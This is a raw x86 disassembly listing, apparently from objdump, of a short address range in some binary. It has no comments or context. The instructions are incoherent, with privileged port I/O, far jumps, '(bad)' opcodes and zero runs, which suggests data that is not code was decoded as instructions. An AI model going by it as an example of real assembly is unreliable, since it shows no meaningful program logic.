  42aa8f:	jge    0x42aace
  42aa91:	addr16 std 
  42aa93:	lods   al,BYTE PTR ds:[esi]
  42aa94:	arpl   WORD PTR [ebx],bp
  42aa96:	pop    ss
  42aa97:	mov    ebx,0xaeca518c
  42aa9c:	nop
  42aa9d:	retf   
  42aa9e:	dec    esp
  42aa9f:	pop    esp
  42aaa0:	out    dx,eax
  42aaa1:	pop    ebx
  42aaa2:	in     eax,0xe6
  42aaa4:	mov    ecx,0x7ff7979a
  42aaa9:	pop    ecx
  42aaaa:	call   FWORD PTR [edx]
  42aaac:	adc    al,0x15
  42aaae:	shr    DWORD PTR [ebx+0x1c65c2b2],cl
  42aab4:	jg     0x42aabd
  42aab6:	iret   
  42aab7:	push   ds
  42aab8:	hlt    
  42aab9:	call   0x961e:0x70a84052
  42aac0:	jle    0x42aa95
  42aac2:	rol    dl,0x5c
  42aac5:	pop    ecx
  42aac6:	push   0x29
  42aac8:	sub    ch,BYTE PTR [ebx-0x341d74f3]
  42aace:	out    0xdb,eax
  42aad0:	int3   
  42aad1:	push   0x3c
  42aad3:	jae    0x42ab21
  42aad5:	jmp    0x72a7:0xcbbe97f4
  42aadc:	cld    
  42aadd:	jo     0x42aab1
  42aadf:	leave  
  42aae0:	aas    
  42aae1:	pop    ss
  42aae2:	pushf  
  42aae3:	adc    eax,0x7485fba9
  42aae8:	jb     0x42aaca
  42aaea:	les    esp,FWORD PTR [ecx]
  42aaec:	retf   
  42aaed:	ds cmc 
  42aaef:	mov    BYTE PTR [ecx+eiz*4-0x7cd6b7ef],ah
  42aaf6:	xor    dl,BYTE PTR ds:[ebx+0x77]
  42aafa:	adc    al,0xa2
  42aafc:	fild   WORD PTR [eax+0x1df85171]
  42ab02:	xor    al,0x34
  42ab04:	jo     0x42aac1
  42ab06:	sub    al,0x20
  42ab08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab09:	and    dl,dh
  42ab0b:	aam    0x21
  42ab0d:	int3   
  42ab0e:	pop    ecx
  42ab0f:	repz add BYTE PTR [eax],al
	...
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	out    dx,eax
  42ab81:	stos   DWORD PTR es:[edi],eax
  42ab82:	push   0x1c8a846
  42ab87:	add    BYTE PTR [ecx+eax*1],al
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	add    al,0xcf
  42ab8e:	(bad)  
  42ab8f:	sub    ebp,DWORD PTR [ecx-0x4ee876b6]
  42ab95:	out    dx,eax
  42ab96:	aas    
  42ab97:	lea    ebp,[ebx]
  42ab99:	pop    ecx
  42ab9a:	mov    cl,0x95
  42ab9c:	ret    0xfa17
  42ab9f:	mov    ebp,0x9d198e27
  42aba4:	pop    ebp
  42aba5:	mov    bl,0xb2
  42aba7:	dec    esi
  42aba8:	sbb    dl,dl
  42abaa:	(bad)  
  42abab:	pop    eax
  42abac:	call   0x688a:0x2511c543
  42abb3:	(bad)  
  42abb4:	or     bl,bh
  42abb6:	jle    0x42ab60
  42abb8:	inc    ecx
  42abb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abba:	and    ebx,edi
  42abbc:	adc    DWORD PTR [edi-0x63f33f89],0x68
  42abc3:	std    
  42abc4:	aaa    
  42abc5:	lock lea eax,[edi]
  42abc8:	retf   
  42abc9:	xchg   al,cl
  42abcb:	cmp    BYTE PTR [edx],ch
  42abcd:	cmp    dh,BYTE PTR [edi+ecx*2+0x4224fc95]
  42abd4:	jg     0x42abd8
  42abd6:	in     al,0xad
  42abd8:	gs jle 0x42ac55
  42abdb:	xlat   BYTE PTR ds:[ebx]
  42abdc:	cmove  ebx,DWORD PTR [edi]
  42abdf:	ret    
  42abe0:	dec    edx
  42abe1:	pop    esi
  42abe2:	pop    eax
  42abe3:	dec    esi
  42abe4:	and    esp,ebp
  42abe6:	stos   BYTE PTR es:[edi],al
  42abe7:	push   0x2d5c46ab
  42abec:	add    dh,bh
  42abee:	out    0x19,al
  42abf0:	adc    DWORD PTR [edx+0x537c37b2],ebp
  42abf6:	xor    al,0x3b
  42abf8:	xor    BYTE PTR [eax-0x7427e3ce],dl
  42abfe:	lds    eax,FWORD PTR [esp+ecx*8]
  42ac01:	fidiv  DWORD PTR [eax-0x4e]
  42ac04:	xchg   esp,eax
  42ac05:	or     ch,ch
  42ac07:	ret    
  42ac08:	sbb    ah,BYTE PTR [ebp+0xc]
  42ac0b:	push   0xeb401f1a
  42ac10:	xor    esp,DWORD PTR [esi]
  42ac12:	mov    edi,0x7c55cb0f
  42ac17:	js     0x42ac33
  42ac19:	dec    ebx
  42ac1a:	push   ss
  42ac1b:	cmp    ebp,DWORD PTR [esi-0x39]
  42ac1e:	imul   ecx,ebp,0xe7201169
  42ac24:	jbe    0x42abb5
  42ac26:	or     ebx,DWORD PTR [ecx+eax*2+0x7f]
  42ac2a:	mov    al,0x70
  42ac2c:	aam    0x5
  42ac2e:	pop    eax
  42ac2f:	dec    eax
  42ac30:	adc    al,BYTE PTR [eax+0x6526623f]
  42ac36:	and    DWORD PTR [ebx+0x25],esi
  42ac39:	pop    ds
  42ac3a:	out    dx,eax
  42ac3b:	xchg   esi,eax
  42ac3c:	mov    BYTE PTR [esi],ah
  42ac3e:	test   DWORD PTR [ebx-0x69],eax
  42ac41:	and    al,0xf1
  42ac43:	lds    ebp,FWORD PTR [edx]
  42ac45:	push   ecx
  42ac46:	pusha  
  42ac47:	cwde   
  42ac48:	stos   BYTE PTR es:[edi],al
  42ac49:	push   ds
  42ac4a:	daa    
  42ac4b:	(bad)  
  42ac4c:	mov    edi,0x815c5280
  42ac51:	lea    eax,[edx]
  42ac53:	aam    0x67
  42ac55:	and    al,0x27
  42ac57:	rcr    DWORD PTR [esi-0x64],1
  42ac5a:	sahf   
  42ac5b:	out    dx,al
  42ac5c:	xor    BYTE PTR [ebx-0x17],bl
  42ac5f:	fwait
  42ac60:	push   ebx
  42ac61:	dec    esi
  42ac62:	mov    esi,0x1b662703
  42ac67:	adc    eax,edi
  42ac69:	test   edi,edi
  42ac6b:	out    0x3,eax
  42ac6d:	pop    ebp
  42ac6e:	ss sbb bl,al
  42ac71:	add    BYTE PTR [eax-0x23],ah
  42ac74:	xor    ah,al
  42ac76:	sub    eax,edi
  42ac78:	dec    ecx
  42ac79:	pusha  
  42ac7a:	mov    ds:0xf7b0b303,al
  42ac7f:	shl    ebx,cl
  42ac81:	out    0x89,eax
  42ac83:	mov    WORD PTR [edi+eax*8],cs
  42ac86:	out    dx,al
  42ac87:	cmp    BYTE PTR [edx+0x1d],bl
  42ac8a:	and    al,0x4a
  42ac8c:	scas   al,BYTE PTR es:[edi]
  42ac8d:	cld    
  42ac8e:	and    bl,BYTE PTR [edx+0x0]
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	loop   0x42ac9a
  42ad02:	data16 lods al,BYTE PTR ds:[si]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	in     eax,0xb7
  42ad0e:	scas   al,BYTE PTR es:[edi]
  42ad0f:	dec    esp
  42ad10:	adc    eax,0x93edd4ff
  42ad15:	inc    edx
  42ad16:	ret    
  42ad17:	sub    eax,0xad50615c
  42ad1c:	stc    
  42ad1d:	call   0xfaba:0x5d5e
  42ad23:	pusha  
  42ad24:	bswap  edi
  42ad26:	lahf   
  42ad27:	ss xchg ecx,eax
  42ad29:	or     eax,0x1639f6a1
  42ad2e:	push   esp
  42ad2f:	xor    BYTE PTR [eax],dl
  42ad31:	lods   al,BYTE PTR ds:[esi]
  42ad32:	xchg   ebx,eax
  42ad33:	retf   0x3bb7
  42ad36:	scas   eax,DWORD PTR es:[edi]
  42ad37:	sbb    DWORD PTR [esi+0x67137172],edi
  42ad3d:	xchg   DWORD PTR [edi],ecx
  42ad3f:	pop    ebx
  42ad40:	loop   0x42ad11
  42ad42:	outs   dx,BYTE PTR ds:[esi]
  42ad43:	repz push esp
  42ad45:	idiv   DWORD PTR [edx+0x4f]
  42ad48:	and    al,0x8e
  42ad4a:	pop    ebp
  42ad4b:	lds    ebx,FWORD PTR [edi+0x43ef4568]
  42ad51:	add    esi,eax
  42ad53:	dec    ebp
  42ad54:	ja     0x42add0
  42ad56:	xor    bh,ch
  42ad58:	mov    BYTE PTR [ebp-0x48],dh
  42ad5b:	pushf  
  42ad5c:	or     eax,0x1e0f582f
  42ad61:	jmp    0x42ad38
  42ad63:	iret   
  42ad64:	inc    DWORD PTR [esi+0x74bc104c]
  42ad6a:	ja     0x42adaa
  42ad6c:	out    dx,al
  42ad6d:	or     dh,BYTE PTR [eax+0x59]
  42ad70:	out    0xed,al
  42ad72:	inc    ebx
  42ad73:	cmp    al,BYTE PTR [edi-0x63e00893]
  42ad79:	and    DWORD PTR [esi],edi
  42ad7b:	dec    ebp
  42ad7c:	rcl    DWORD PTR [edi+eax*8+0x2e0743b8],1
  42ad83:	jo     0x42adda
  42ad85:	iret   
  42ad86:	ins    BYTE PTR es:[edi],dx
  42ad87:	sti    
  42ad88:	mov    ebx,0x9127eefe
  42ad8d:	sti    
  42ad8e:	ret    0x605b
  42ad91:	cs rcr ch,cl
  42ad94:	stos   BYTE PTR es:[edi],al
  42ad95:	inc    ecx
  42ad96:	xlat   BYTE PTR ds:[ebx]
  42ad97:	test   BYTE PTR cs:[esi-0xb],al
  42ad9b:	pop    es
  42ad9c:	ins    BYTE PTR es:[edi],dx
  42ad9d:	cli    
  42ad9e:	(bad)  
  42ad9f:	mov    dh,0x2
  42ada1:	into   
  42ada2:	clc    
  42ada3:	(bad)  
  42ada4:	mov    ebp,esi
  42ada6:	retf   
  42ada7:	mov    eax,0xc9f486de
  42adac:	mov    BYTE PTR [ecx-0x597dfcbd],ah
  42adb2:	pop    edi
  42adb3:	loop   0x42ae14
  42adb5:	sub    dl,BYTE PTR [esi]
  42adb7:	dec    edi
  42adb8:	call   0x64d9:0xd3eca4d1
  42adbf:	repz rol BYTE PTR [ebp-0x24bccab6],1
  42adc6:	sbb    ebx,esp
  42adc8:	in     al,dx
  42adc9:	cs ins DWORD PTR es:[edi],dx
  42adcb:	jae    0x42ad94
  42adcd:	inc    edx
  42adce:	shr    DWORD PTR [edx],0xed
  42add1:	jmp    0x42ada7
  42add3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42add4:	mov    ds:0x81e3b63,al
  42add9:	mov    ecx,0x6088853c
  42adde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42addf:	(bad)  
  42ade0:	pop    ebx
  42ade1:	jge    0x42ae53
  42ade3:	inc    ecx
  42ade4:	into   
  42ade5:	into   
  42ade6:	sbb    DWORD PTR [esi+0x3e00a87b],eax
  42adec:	push   eax
  42aded:	nop
  42adee:	or     ebx,edx
  42adf0:	lods   al,BYTE PTR ds:[esi]
  42adf1:	loop   0x42ae63
  42adf3:	imul   eax,DWORD PTR [ecx+ecx*4-0x79],0x64
  42adf8:	ficomp WORD PTR [ebx+0x4c4fe764]
  42adfe:	pop    ss
  42adff:	jnp    0x42adbb
  42ae01:	mov    eax,0x34315e43
  42ae06:	ins    DWORD PTR es:[edi],dx
  42ae07:	cdq    
  42ae08:	sar    ebp,cl
  42ae0a:	(bad)  
  42ae0b:	pop    esp
  42ae0c:	das    
  42ae0d:	sbb    BYTE PTR [esi+0xe5],ch
	...
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	mov    ebx,0xb048361c
  42ae85:	retf   0x1
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	scas   eax,DWORD PTR es:[edi]
  42ae8d:	mov    edx,0x3f40e065
  42ae92:	mov    ds:0xe709eb6f,al
  42ae97:	bndstx [ebx+0x1eeb91cd],bnd1
  42ae9e:	sub    al,0xe2
  42aea0:	leave  
  42aea1:	repnz push es
  42aea3:	inc    edx
  42aea4:	and    al,bl
  42aea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aea7:	xchg   ebp,eax
  42aea8:	out    0x9a,eax
  42aeaa:	jmp    0xc5426e07
  42aeaf:	dec    esi
  42aeb0:	repz cmp eax,0xf0268a82
  42aeb6:	adc    edx,0x50
  42aeb9:	adc    eax,0x87e4d341
  42aebe:	stc    
  42aebf:	fild   DWORD PTR [edx+0x5]
  42aec2:	lock leave 
  42aec4:	lahf   
  42aec5:	pop    ecx
  42aec6:	push   ebx
  42aec7:	mov    ds:0x8cb88914,al
  42aecc:	mov    ds:0xb2fbc1be,eax
  42aed1:	enter  0x82f2,0xf8
  42aed5:	add    BYTE PTR [edx+0x39790330],bl
  42aedb:	add    DWORD PTR [edx+0x2f],esi
  42aede:	shl    BYTE PTR [edx],1
  42aee0:	push   ecx
  42aee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aee2:	inc    eax
  42aee3:	push   0x71223619
  42aee8:	jg     0x42aeaa
  42aeea:	sti    
  42aeeb:	mov    bl,0x65
  42aeed:	inc    ebp
  42aeee:	and    ecx,edx
  42aef0:	or     al,0x2d
  42aef2:	xor    ah,BYTE PTR [eax]
  42aef4:	and    BYTE PTR [esi+ebx*4-0x51f24abc],0xf0
  42aefc:	nop
  42aefd:	(bad)  [ebp-0x3b]
  42af00:	sub    esi,ecx
  42af02:	jecxz  0x42aede
  42af04:	fistp  WORD PTR [ebp+0x440e81c0]
  42af0a:	xor    edx,edx
  42af0c:	pop    edx
  42af0d:	int3   
  42af0e:	popf   
  42af0f:	daa    
  42af10:	loop   0x42af8b
  42af12:	xchg   ecx,eax
  42af13:	aaa    
  42af14:	and    edi,DWORD PTR [ebp-0x37d5bc73]
  42af1a:	mov    al,0x31
  42af1c:	xchg   DWORD PTR [ebx-0x4c],esp
  42af1f:	mov    edx,0xab1d2c5d
  42af24:	jbe    0x42aee9
  42af26:	mov    cl,0xdf
  42af28:	mov    al,0x71
  42af2a:	jmp    DWORD PTR [ebp+0x1e]
  42af2d:	mov    edx,0x77f4b9c2
  42af32:	adc    al,0x1f
  42af34:	or     DWORD PTR [ecx-0x1b367884],ecx
  42af3a:	push   ecx
  42af3b:	or     ebp,DWORD PTR [ecx+0x42]
  42af3e:	ret    0xb9c1
  42af41:	mov    DWORD PTR [eax],0x6639cf8d
  42af47:	lahf   
  42af48:	add    al,0xf2
  42af4a:	pop    ss
  42af4b:	imul   ecx,ecx,0xffffff80
  42af4e:	ins    DWORD PTR es:[edi],dx
  42af4f:	in     eax,0x80
  42af51:	xor    DWORD PTR [ebx-0x5430922d],ebx
  42af57:	stc    
  42af58:	push   ss
  42af59:	xchg   edi,eax
  42af5a:	mov    al,ds:0x7612d1b1
  42af5f:	adc    bh,bl
  42af61:	pushf  
  42af62:	shl    BYTE PTR [esp+ecx*2-0x2f40a939],cl
  42af69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af6a:	xor    al,0xa
  42af6c:	fisttp WORD PTR [ebx+0x1558210b]
  42af72:	pop    edx
  42af73:	aam    0x2e
  42af75:	outs   dx,BYTE PTR ds:[esi]
  42af76:	mov    eax,0x24461ec7
  42af7b:	cmp    ecx,DWORD PTR [esi-0x3fd3bd21]
  42af81:	jp     0x42af2f
  42af83:	js     0x42af73
  42af85:	push   edi
  42af86:	fs mov cl,0xd9
  42af89:	cs mov esi,0xbf60cdb8
  42af8f:	inc    BYTE PTR [eax]
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	push   ds
  42b001:	pop    esp
  42b002:	push   eax
  42b003:	push   eax
  42b004:	mov    ah,0xcb
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	gs (bad) 
  42b00e:	hlt    
  42b00f:	add    eax,0x33a9bba
  42b014:	add    DWORD PTR [edx+0x12],0x60dd3d9e
  42b01b:	test   eax,0x65072447
  42b020:	xchg   esp,eax
  42b021:	push   es
  42b022:	jmp    0x29530a45
  42b027:	sub    cl,0xc5
  42b02a:	mov    bl,0x4
  42b02c:	loop   0x42b000
  42b02e:	fadd   QWORD PTR [ebx-0x27]
  42b031:	fisttp WORD PTR [edx-0x56]
  42b034:	outs   dx,BYTE PTR ds:[esi]
  42b035:	push   0xe0ca8d65
  42b03a:	jge    0x42b094
  42b03c:	or     al,0xca
  42b03e:	mov    ds:0xdaebfb6b,eax
  42b043:	stc    
  42b044:	push   0xefbb02bf
  42b049:	int3   
  42b04a:	xor    BYTE PTR [ebx-0x5e],dl
  42b04d:	nop
  42b04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b04f:	imul   esp,DWORD PTR [edi],0xe73a5004
  42b055:	(bad)  
  42b056:	repnz dec eax
  42b058:	xchg   ecx,eax
  42b059:	loope  0x42b08b
  42b05b:	xor    edx,DWORD PTR [edi-0x14fcdde7]
  42b061:	xchg   ecx,eax
  42b062:	push   ebp
  42b063:	bsf    ebx,DWORD PTR [ebx+eiz*8+0x55a886c4]
  42b06b:	int    0x31
  42b06d:	xchg   edi,eax
  42b06e:	jp     0x42b035
  42b070:	gs sub al,bl
  42b073:	mov    ebx,0xc01cf91c
  42b078:	retf   
  42b079:	push   ecx
  42b07a:	addr16 ret 
  42b07c:	fcmovbe st,st(6)
  42b07e:	stc    
  42b07f:	fild   WORD PTR [edx]
  42b081:	jmp    0x42b03e
  42b083:	rcr    ebx,0x2c
  42b086:	mov    dh,0x3e
  42b088:	inc    ebx
  42b089:	sbb    esi,DWORD PTR [ecx]
  42b08b:	mov    al,0xd2
  42b08d:	pop    eax
  42b08e:	sbb    eax,0xc6956795
  42b093:	add    al,0x8f
  42b095:	mov    ch,BYTE PTR [edi]
  42b097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b098:	mov    ecx,es
  42b09a:	cwde   
  42b09b:	xor    ebx,DWORD PTR [eax]
  42b09d:	into   
  42b09e:	div    BYTE PTR [edi]
  42b0a0:	sbb    ah,BYTE PTR [edi]
  42b0a2:	push   cs
  42b0a3:	pop    edi
  42b0a4:	push   ebx
  42b0a5:	test   eax,0x537f365
  42b0aa:	test   al,0x10
  42b0ac:	outs   dx,BYTE PTR ds:[esi]
  42b0ad:	mov    al,ds:0x28efb840
  42b0b2:	adc    DWORD PTR [esi+eax*4+0x7287f5f2],esi
  42b0b9:	sub    edi,DWORD PTR [ebx-0xa]
  42b0bc:	xchg   edi,ecx
  42b0be:	fnstenv [ebx+0x7114e54b]
  42b0c4:	(bad)  
  42b0c5:	jecxz  0x42b05f
  42b0c7:	pop    edx
  42b0c8:	xchg   ebx,eax
  42b0c9:	xor    BYTE PTR [esi],bh
  42b0cb:	call   0x1a8c66d3
  42b0d0:	mov    ch,dh
  42b0d2:	xor    DWORD PTR [edx],ecx
  42b0d4:	sub    eax,0xc2edd244
  42b0d9:	sbb    al,0x3b
  42b0db:	popf   
  42b0dc:	pop    esi
  42b0dd:	add    ebx,DWORD PTR cs:[ebx+0x22]
  42b0e1:	in     eax,0x94
  42b0e3:	mov    al,ds:0x906fa9d
  42b0e8:	popa   
  42b0e9:	or     eax,0x6988d73d
  42b0ee:	inc    ebp
  42b0ef:	pop    ss
  42b0f0:	icebp  
  42b0f1:	and    BYTE PTR ds:0xd3929143,al
  42b0f7:	xor    eax,0x1cd0d414
  42b0fc:	cmp    al,0x68
  42b0fe:	xchg   ebp,eax
  42b0ff:	xchg   esi,eax
  42b100:	gs iret 
  42b102:	inc    BYTE PTR [ebx-0x6282be9e]
  42b108:	ret    
  42b109:	mov    edx,0xb237120a
  42b10e:	into   
  42b10f:	int3   
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	jl     0x42b10e
  42b182:	sbb    al,0x4c
  42b184:	mov    eax,0x40001cc
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    BYTE PTR ds:0xac040ddd,bh
  42b191:	and    al,BYTE PTR [ecx-0x2f68829b]
  42b197:	xor    BYTE PTR [ecx-0x48cc2f01],bl
  42b19d:	pop    DWORD PTR [esi]
  42b19f:	jae    0x42b1fc
  42b1a1:	mov    ds:0xbcb30861,eax
  42b1a6:	fstp   TBYTE PTR [esi+0x5aec2be8]
  42b1ac:	pop    ebp
  42b1ad:	push   ebx
  42b1ae:	pop    es
  42b1af:	das    
  42b1b0:	test   ebp,esp
  42b1b2:	aas    
  42b1b3:	and    ecx,esp
  42b1b5:	sti    
  42b1b6:	pop    ebx
  42b1b7:	adc    al,0x2f
  42b1b9:	cmp    DWORD PTR ds:0x91487251,ebx
  42b1bf:	aad    0xd3
  42b1c1:	ins    BYTE PTR es:[edi],dx
  42b1c2:	sar    esi,1
  42b1c4:	out    dx,eax
  42b1c5:	or     BYTE PTR [edx-0x57],cl
  42b1c8:	xor    cl,bh
  42b1ca:	push   esp
  42b1cb:	xor    eax,0x90507c08
  42b1d0:	icebp  
  42b1d1:	cld    
  42b1d2:	lds    edi,FWORD PTR [ecx+0x4b]
  42b1d5:	mov    eax,ds:0x2d247f7a
  42b1da:	outs   dx,BYTE PTR ds:[esi]
  42b1db:	scas   al,BYTE PTR es:[edi]
  42b1dc:	jb     0x42b25a
  42b1de:	les    ecx,FWORD PTR [edi+ecx*2-0x77659da8]
  42b1e5:	mov    al,0x48
  42b1e7:	out    dx,eax
  42b1e8:	mov    ebp,0xbcf1b4c5
  42b1ed:	aam    0xc
  42b1ef:	jmp    0x42b211
  42b1f1:	scas   al,BYTE PTR es:[edi]
  42b1f2:	push   0x3c
  42b1f4:	mov    ah,dl
  42b1f6:	mov    bh,dl
  42b1f8:	fsubrp st(1),st
  42b1fa:	and    BYTE PTR [ecx-0x18],dh
  42b1fd:	jmp    0xa6d0:0x475ff61e
  42b204:	loopne 0x42b27b
  42b206:	jb     0x42b193
  42b208:	test   BYTE PTR [edx-0x78],dl
  42b20b:	pop    ebx
  42b20c:	add    bl,BYTE PTR [ecx]
  42b20e:	pusha  
  42b20f:	inc    esp
  42b210:	leave  
  42b211:	inc    esi
  42b212:	add    BYTE PTR ds:0xa3d4ad44,bl
  42b218:	xchg   esi,eax
  42b219:	inc    edi
  42b21a:	(bad)  
  42b21c:	cld    
  42b21d:	cmp    al,0xde
  42b21f:	push   0x63be479c
  42b224:	cs jp  0x42b1cb
  42b227:	push   edi
  42b228:	fisttp DWORD PTR [esi-0x60]
  42b22b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b22c:	dec    dx
  42b22e:	jmp    0xb1da:0x87841462
  42b235:	xlat   BYTE PTR ds:[ebx]
  42b236:	or     dh,bl
  42b238:	xor    eax,DWORD PTR [eax]
  42b23a:	and    ch,BYTE PTR [esi]
  42b23c:	les    ebx,FWORD PTR [ebx+0x51]
  42b23f:	mov    WORD PTR [edx-0x13497bd8],ss
  42b245:	xchg   ecx,eax
  42b246:	sbb    eax,0x33044213
  42b24b:	cmp    al,0x4e
  42b24d:	aam    0xe3
  42b24f:	pop    esp
  42b250:	into   
  42b251:	push   edi
  42b252:	xchg   ebp,eax
  42b253:	stc    
  42b254:	sbb    eax,0x6ee0e3ed
  42b259:	imul   edx,DWORD PTR [ebp-0x68],0xffffff84
  42b25d:	jne    0x42b2a6
  42b25f:	add    ebx,DWORD PTR [edi+eiz*4+0x6156a90a]
  42b266:	jb     0x42b260
  42b268:	addr16 into 
  42b26a:	add    dh,BYTE PTR [esi]
  42b26c:	ins    BYTE PTR es:[edi],dx
  42b26d:	inc    esi
  42b26e:	sub    BYTE PTR [esi],ch
  42b270:	xor    BYTE PTR [ebx],dl
  42b272:	push   edi
  42b273:	dec    edi
  42b274:	lock in eax,0x8c
  42b277:	ja     0x42b2c4
  42b279:	xor    DWORD PTR [edi],eax
  42b27b:	es inc ebx
  42b27d:	mov    al,ds:0x985905db
  42b282:	xor    BYTE PTR [ebp-0x15],ch
  42b285:	les    edi,FWORD PTR [esi+0x7118b69b]
  42b28b:	std    
  42b28c:	stc    
  42b28d:	xchg   DWORD PTR [eax-0x5c],edx
	...
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0xc5738e65
  42b301:	pushf  
  42b302:	pop    edx
  42b303:	repnz mov esp,0x40001cd
  42b309:	add    DWORD PTR [eax],eax
  42b30b:	add    BYTE PTR [edx],ah
  42b30d:	call   0xeb4f:0x50ea1b4d
  42b314:	cli    
  42b315:	call   0x15ab:0xc340
  42b31b:	or     esp,esp
  42b31d:	cmc    
  42b31e:	mov    edi,DWORD PTR [ecx+0xc]
  42b321:	jg     0x42b2ba
  42b323:	sbb    cl,BYTE PTR [ecx-0x2e815acf]
  42b329:	call   0xa3f22b02
  42b32e:	dec    edx
  42b32f:	mov    ebx,0xd1aba8de
  42b334:	and    DWORD PTR [esp+ebp*1-0x36ae660d],esp
  42b33b:	popa   
  42b33c:	jp     0x42b300
  42b33e:	inc    eax
  42b33f:	stos   BYTE PTR es:[edi],al
  42b340:	pop    ss
  42b341:	jbe    0x42b3a0
  42b343:	into   
  42b344:	(bad)  
  42b345:	(bad)  
  42b346:	lods   al,BYTE PTR ds:[esi]
  42b347:	mov    dh,0x3
  42b349:	or     eax,DWORD PTR [edx-0x56]
  42b34c:	dec    ebp
  42b34d:	ins    DWORD PTR es:[edi],dx
  42b34e:	dec    edx
  42b34f:	pop    eax
  42b350:	cwde   
  42b351:	jbe    0x42b304
  42b353:	cli    
  42b354:	icebp  
  42b355:	xor    edx,eax
  42b357:	jmp    0x4b53:0x15ae54cc
  42b35e:	mov    esp,0xe6406833
  42b363:	ficom  WORD PTR [ecx-0x1a863cdc]
  42b369:	dec    ebx
  42b36a:	pop    es
  42b36b:	and    ax,0x239b
  42b36f:	fmul   DWORD PTR [ebp-0x714a7f67]
  42b375:	js     0x42b389
  42b377:	push   cs
  42b378:	daa    
  42b379:	xchg   ecx,eax
  42b37a:	mov    al,0x38
  42b37c:	sbb    BYTE PTR [ebx],bh
  42b37e:	xchg   edi,eax
  42b37f:	cld    
  42b380:	jge    0x42b34b
  42b382:	mov    ds:0xf8a0a7a0,eax
  42b387:	imul   ebx,DWORD PTR [ecx],0x58b4ee82
  42b38d:	xchg   ebp,eax
  42b38e:	ss jmp 0xb979:0x3ed4db34
  42b396:	popa   
  42b397:	fs push edx
  42b399:	sahf   
  42b39a:	repz dec edx
  42b39c:	ja     0x42b3da
  42b39e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b39f:	fild   QWORD PTR [eax+0x79fc8c81]
  42b3a5:	fcomp  st(7)
  42b3a7:	and    al,0xf8
  42b3a9:	sbb    al,0xa3
  42b3ab:	sub    eax,0xf9a2b2fb
  42b3b0:	add    bl,dl
  42b3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3b3:	arpl   WORD PTR [ebx+ebx*8+0x76ace870],si
  42b3ba:	sub    esp,DWORD PTR [esi]
  42b3bc:	in     eax,0xe5
  42b3be:	(bad)  
  42b3bf:	xchg   esi,eax
  42b3c0:	rcl    DWORD PTR [ecx+0xd42dc46],0xcc
  42b3c7:	into   
  42b3c8:	out    0x4a,eax
  42b3ca:	adc    ebx,DWORD PTR [esi-0x6f08388b]
  42b3d0:	stos   DWORD PTR es:[edi],eax
  42b3d1:	push   ebx
  42b3d2:	xcrypt-cfb (bad)
  42b3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3d4:	in     eax,0x31
  42b3d6:	dec    esp
  42b3d7:	mov    ebp,0x5c108c2b
  42b3dc:	inc    DWORD PTR [edx]
  42b3de:	inc    edi
  42b3df:	mov    edx,0x71a272eb
  42b3e4:	push   edx
  42b3e5:	cmp    al,0x2d
  42b3e7:	hlt    
  42b3e8:	sbb    eax,DWORD PTR [ebp-0x5b]
  42b3eb:	sahf   
  42b3ec:	add    al,0x5a
  42b3ee:	push   0x6dc6fb80
  42b3f3:	popf   
  42b3f4:	jle    0x42b37f
  42b3f6:	jecxz  0x42b422
  42b3f8:	xor    BYTE PTR [ebp+0x4466551d],dl
  42b3fe:	mov    ds:0xf5b41fba,al
  42b403:	loop   0x42b3a5
  42b405:	push   eax
  42b406:	xchg   BYTE PTR [ebp+0xe],ah
  42b409:	ins    BYTE PTR es:[edi],dx
  42b40a:	xchg   edx,eax
  42b40b:	jns    0x42b45f
  42b40d:	popf   
  42b40e:	add    DWORD PTR [eax],eax
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [esi+ebx*1-0x313f5ffa],esp
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	fld    QWORD PTR [ecx-0x46]
